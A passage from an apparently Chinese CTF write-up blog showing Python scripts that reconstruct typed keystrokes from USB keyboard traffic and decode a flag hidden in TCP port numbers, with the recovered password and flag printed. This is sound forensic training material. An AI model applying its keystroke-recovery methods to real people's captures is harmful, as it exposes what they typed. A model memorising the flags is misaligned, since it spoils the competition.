class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>             <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>             <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>             <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>             <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-comment">#这里是加号冒号的数据</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>得到解压包密码</p><p><code>!@#qwer123_DASCTF_okok</code></p><p>根据题目信息 观察流量包 端口均为0123</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">as</span> scapy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_port_packets</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    从指定的 pcapng 文件中读取 TCP 端口信息并解码。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param filename: pcapng 文件路径</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 读取 pcapng 文件中的所有包信息</span><br>    packets = scapy.rdpcap(filename)<br><br>    <span class="hljs-comment"># 提取包中的 TCP 端口号信息，存储到列表中</span><br>    ports = [packet[<span class="hljs-string">&#x27;TCP&#x27;</span>].dport <span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> packets]<br><br>    <span class="hljs-comment"># 去掉前 10 个端口号</span><br>    ports = ports[<span class="hljs-number">10</span>:]<br><br>    <span class="hljs-comment"># 将列表中的 TCP 端口号重新组织成若干个连续段</span><br>    port_groups = []<br>    tmp_group = []<br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">200</span> != port:<br>            tmp_group.append(port)<br>        <span class="hljs-keyword">else</span>:<br>            port_groups.append(tmp_group)<br>            tmp_group = []<br>    <br>    <span class="hljs-comment"># 将每个连续段内的 TCP 端口号转换为四进制数字，并拼接为一个字符串</span><br>    four_numbers = []<br>    <span class="hljs-keyword">for</span> group <span class="hljs-keyword">in</span> port_groups:<br>        four_number = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> group:<br>            four_number += <span class="hljs-built_in">str</span>(port % <span class="hljs-number">10000</span>)<br>        four_numbers.append(four_number)<br><br>    <span class="hljs-comment"># 将每个四进制数字字符串解码为 ASCII 字符串，并打印输出</span><br>    <span class="hljs-keyword">for</span> four_number <span class="hljs-keyword">in</span> four_numbers:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(four_number, <span class="hljs-number">4</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 测试代码，读取 port.pcapng 文件并解码其中的 TCP 端口信息</span><br>decode_port_packets(<span class="hljs-string">&#x27;port.pcapng&#x27;</span>)<br><br><span class="hljs-comment">#DASCTF&#123;67011b0c-ba47-488f-9beb-283e7352e35e&#125;</span><br></code></pre></td></tr></table></figure><h2 id="2023HWS夏令营入营赛"><a href="#2023HWS夏令营入营赛" class="headerlink" title="2023HWS夏令营入营赛"></a>2023HWS夏令营入营赛</h2><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>前面是常规键盘流量分析，后面有点野路子。<br><code>tshark -r misc1.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   a=f.readline().strip()<br>   <span class="hljs-keyword">if</span> a:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)== <span class="hljs-number">16</span>: <span class="hljs-comment"># 鼠标流量的话 len 改为 8</span><br>          out=<span class="hljs-string">&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>              <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                  out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>              <span class="hljs-keyword">else</span>:<br>                 out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>          fi.write(out)<br>          fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">break</span><br>fi.close()<br></code></pre></td></tr></table></figure><p>发现导出的数据第一列有异常，部分为<code>20</code>，常见的键盘流量分析题目，均为<code>00</code> <code>01</code> <code>02</code>等类型，遂手动将第一列的<code>20</code>改为<code>02</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br> <br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>             <span 